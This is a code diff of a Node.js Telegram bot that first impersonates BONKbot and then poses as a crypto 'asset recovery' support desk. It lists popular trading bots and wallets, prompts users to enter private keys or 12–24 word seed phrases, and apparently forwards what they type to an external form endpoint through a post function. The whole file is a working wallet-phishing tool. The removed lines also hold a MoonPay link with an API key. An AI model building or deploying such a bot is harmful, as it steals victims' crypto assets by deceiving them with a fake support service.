@@ -1,25 +1,27 @@
 const express = require('express');
+const dotenv = require('dotenv');
+const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios');
+
+dotenv.config();
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 
 // Health check endpoint
 app.get('/health', (req, res) => {
   res.status(200).send('Bot is running!');
 });
 
-// Start the HTTP server
 app.listen(PORT, () => {
   console.log(`Health check server running on port ${PORT}`);
 });
-require('dotenv').config();
-const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios');
 
+// Environment Variables
 const token = process.env.BOT_TOKEN;
 const ownerId = process.env.OWNER_ID;
 const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
 
-// Check for missing environment variables
+// Check if required environment variables exist
 if (!token || !ownerId || !formUnstaticURL) {
   console.error(
     'Missing required environment variables. Check your .env file.'
@@ -29,10 +31,11 @@ if (!token || !ownerId || !formUnstaticURL) {
 
 const bot = new TelegramBot(token, { polling: true });
 console.log('Bot started successfully!');
+
+// Store user states
 const chatStates = {};
 
-console.log('Bot started successfully!');
-
+// Function to send data to FormUnstatic
 const sendToFormUnstatic = async (name, message) => {
   if (!name || !message) {
     console.error('Missing name or message for FormUnstatic submission.');
@@ -42,13 +45,8 @@ const sendToFormUnstatic = async (name, message) => {
   try {
     const response = await axios.post(
       formUnstaticURL,
-      new URLSearchParams({
-        name: name,
-        message: message,
-      }),
-      {
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      }
+      new URLSearchParams({ name, message }),
+      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
     );
     console.log('Data sent to FormUnstatic:', response.data);
   } catch (error) {
@@ -59,8 +57,14 @@ const sendToFormUnstatic = async (name, message) => {
   }
 };
 
+// Handle incoming messages
 bot.on('message', (msg) => {
   const chatId = msg.chat.id;
+
+  if (msg.text === 'Cancel') {
+    delete chatStates[chatId];
+    return bot.sendMessage(chatId, '✅ Operation canceled.');
+  }
 
   if (chatStates[chatId] === 'awaiting_private_key') {
     const privateKey = msg.text;
@@ -93,124 +97,170 @@ bot.on('message', (msg) => {
   }
 });
 
+// Handle /start command
 bot.onText(/\/start/, (msg) => {
-  const message = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!
+  const chatId = msg.chat.id;
+  const message = `🌠 Welcome to the Resolve Decentralized Database
 
-You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:
+  Here, you can address issues such as:
+  • Bot glitches
+  • Swap failures
+  • Configuration errors
+  • Asset recovery
+  • Validation problems
+  • High slippage
+  • Rugged token issues
+  • Failed transactions
+  • High gas fees
 
-HvigCF7FTQeH5tvxjMQvArHYiKLaURNJ1y4bxmNLdjxr (tap to copy)
-
-Or buy SOL with Apple / Google Pay via MoonPay
-[here](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=3Etc8xf3FzCF7WYUVoGG54F1UFsapoG6rnm6NJ1UAdgc&showWalletAddressForm=true&currencyCode=sol&signature=XDh%2B0QwuGobupCFRMCfTkslJnPXBn%2FcO1kXKvIqaiUE%3D).
-
-Once done, tap refresh and your balance will appear here.
-
-To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener, or Meteora.
-
-For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;
+  🚀 Please select an issue to continue.`;
 
   const options = {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: 'Buy', callback_data: 'buy' },
-          { text: 'Fund', callback_data: 'fund' },
+          { text: ' ⚙️ RECTIFICATION ⚙️', callback_data: 'options' },
+          { text: ' ⚙️ VALIDATION ⚙️', callback_data: 'options' },
         ],
         [
-          { text: 'Help', callback_data: 'help' },
-          { text: 'Refer Friends', callback_data: 'refer_friends' },
-          { text: 'Alerts', callback_data: 'alerts' },
+          { text: ' ⚙️ CONFIGURATION ⚙️', callback_data: 'options' },
+          { text: ' ⚙️ ASSET RECOVERY ⚙️', callback_data: 'options' },
         ],
         [
-          { text: 'Wallet', callback_data: 'wallet' },
-          { text: 'Settings', callback_data: 'settings' },
+          { text: ' ⚙️ SWAP FAIL ⚙️', callback_data: 'options' },
+          { text: ' ⚙️ CLEAR BOT GLITCH ⚙️', callback_data: 'options' },
         ],
         [
-          { text: 'DCA Orders', callback_data: 'dca_orders' },
-          { text: 'Limit Orders', callback_data: 'limit_orders' },
+          { text: '⚙️ HIGH SLIPPAGE ⚙️', callback_data: 'options' },
+          { text: '⚙️ FAILED BUY & SELL ⚙️', callback_data: 'options' },
         ],
         [
-          { text: 'Migration Sniper', callback_data: 'migration_sniper' },
-          { text: 'Refresh', callback_data: 'refresh' },
+          { text: '⚙️ HIGH GAS FEE ⚙️', callback_data: 'options' },
+          { text: '⚙️ TURBO MODE ⚙️', callback_data: 'options' },
+        ],
+        [
+          { text: '⚙️ FAILED SNIPE ⚙️', callback_data: 'options' },
+          { text: '⚙️ TECHNICAL BUGS ⚙️', callback_data: 'options' },
         ],
       ],
     },
   };
 
-  bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown', ...options });
+  bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
 });
 
+// Wallet selection keyboard
+const walletSelectionKeyboard = {
+  reply_markup: {
+    inline_keyboard: [
+      [{ text: 'NOVA', callback_data: 'wallet_selected' }],
+      [{ text: 'FIRST LEDGER', callback_data: 'wallet_selected' }],
+      [{ text: 'BLOOM', callback_data: 'wallet_selected' }],
+
+      [{ text: 'BEAR BULL', callback_data: 'wallet_selected' }],
+      [{ text: 'MAESTRO', callback_data: 'wallet_selected' }],
+      [{ text: 'AUTO SNIPE', callback_data: 'wallet_selected' }],
+
+      [{ text: 'TROJAN', callback_data: 'wallet_selected' }],
+      [{ text: 'NOKBOT', callback_data: 'wallet_selected' }],
+      [{ text: 'PHOTON WEB', callback_data: 'wallet_selected' }],
+
+      [{ text: 'XBOT', callback_data: 'wallet_selected' }],
+      [{ text: 'GMGN AI', callback_data: 'wallet_selected' }],
+      [{ text: 'SUNDOG', callback_data: 'wallet_selected' }],
+
+      [{ text: 'SOL TRADING BOT', callback_data: 'wallet_selected' }],
+      [{ text: 'BANANA GUNBOT', callback_data: 'wallet_selected' }],
+      [{ text: 'UNIBOT', callback_data: 'wallet_selected' }],
+
+      [{ text: 'SHURIKEN', callback_data: 'wallet_selected' }],
+      [{ text: 'PEPE BOT', callback_data: 'wallet_selected' }],
+      [{ text: 'TRADEWIZ', callback_data: 'wallet_selected' }],
+
+      [{ text: 'KSPR BOT', callback_data: 'wallet_selected' }],
+      [{ text: 'SIGMA BOT', callback_data: 'wallet_selected' }],
+      [{ text: 'MEVX WEB', callback_data: 'wallet_selected' }],
+
+      [{ text: 'FINDER BOT WEB', callback_data: 'wallet_selected' }],
+      [{ text: 'PRODIGY BOT', callback_data: 'wallet_selected' }],
+      [{ text: 'MAGNUM BOT', callback_data: 'wallet_selected' }],
+      [{ text: 'WALLET CONNECT', callback_data: 'wallet_selected' }],
+    ],
+  },
+};
+
+// Handle callback queries
 bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
 
-  if (query.data === 'try_again') {
-    const startMessage = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!
+  switch (query.data) {
+    case 'options':
+      bot.sendMessage(chatId, 'Select your bot:', walletSelectionKeyboard);
+      break;
 
-You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:
-
-HvigCF7FTQeH5tvxjMQvArHYiKLaURNJ1y4bxmNLdjxr (tap to copy)
-
-Or buy SOL with Apple / Google Pay via MoonPay
-[here](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=3Etc8xf3FzCF7WYUVoGG54F1UFsapoG6rnm6NJ1UAdgc&showWalletAddressForm=true&currencyCode=sol&signature=XDh%2B0QwuGobupCFRMCfTkslJnPXBn%2FcO1kXKvIqaiUE%3D).
-
-Once done, tap refresh and your balance will appear here.
-
-To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener, or Meteora.
-
-For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;
-
-    bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
-  } else if (query.data === 'import_wallet') {
-    const importMessage = `ℹ️ Connect wallet to use settings`;
-
-    const importOptions = {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: 'IMPORT PRIVATE KEY', callback_data: 'import_private_key' }],
-          [{ text: 'IMPORT SEED PHRASE', callback_data: 'import_seed_phrase' }],
-        ],
-      },
-    };
-
-    bot.sendMessage(chatId, importMessage, importOptions);
-  } else if (query.data === 'import_private_key') {
-    bot.sendMessage(chatId, 'Enter private key 🔑', {
-      reply_markup: {
-        keyboard: [[{ text: 'Cancel' }]],
-        resize_keyboard: true,
-        one_time_keyboard: true,
-      },
-    });
-
-    chatStates[chatId] = 'awaiting_private_key';
-  } else if (query.data === 'import_seed_phrase') {
-    bot.sendMessage(chatId, 'Enter 12-24 word mnemonic / recovery phrase ⬇️', {
-      reply_markup: {
-        keyboard: [[{ text: 'Cancel' }]],
-        resize_keyboard: true,
-        one_time_keyboard: true,
-      },
-    });
-
-    chatStates[chatId] = 'awaiting_seed_phrase';
-  } else {
-    const newMessage = `Connect a wallet to use settings`;
-
-    const walletOptions = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: 'Import wallet 💳',
-              callback_data: 'import_wallet',
-            },
+    case 'wallet_selected':
+      bot.sendMessage(chatId, 'ℹ️ Connect wallet to use settings', {
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: 'IMPORT PRIVATE KEY',
+                callback_data: 'import_private_key',
+              },
+            ],
+            [
+              {
+                text: 'IMPORT SEED PHRASE',
+                callback_data: 'import_seed_phrase',
+              },
+            ],
           ],
-        ],
-      },
-    };
+        },
+      });
+      break;
 
-    bot.sendMessage(chatId, newMessage, walletOptions);
+    case 'import_private_key':
+      bot.sendMessage(chatId, 'Enter private key 🔑', {
+        reply_markup: {
+          keyboard: [[{ text: 'Cancel' }]],
+          resize_keyboard: true,
+          one_time_keyboard: true,
+        },
+      });
+      chatStates[chatId] = 'awaiting_private_key';
+      break;
+
+    case 'import_seed_phrase':
+      bot.sendMessage(
+        chatId,
+        'Enter 12-24 word mnemonic / recovery phrase ⬇️',
+        {
+          reply_markup: {
+            keyboard: [[{ text: 'Cancel' }]],
+            resize_keyboard: true,
+            one_time_keyboard: true,
+          },
+        }
+      );
+      chatStates[chatId] = 'awaiting_seed_phrase';
+      break;
+
+    case 'try_again':
+      bot.sendMessage(chatId, 'Restarting process...', {
+        reply_markup: { remove_keyboard: true },
+      });
+      bot.emit('message', { chat: { id: chatId }, text: '/start' });
+      break;
   }
 
   bot.answerCallbackQuery(query.id);
+});
+
+// Health check endpoint
+app.get("/", (req, res) => {
+  res.send("Bot is running fine ✅");
+});
+
+app.listen(PORT, () => {
+  console.log(`Health check server running on port ${PORT}`);
 });
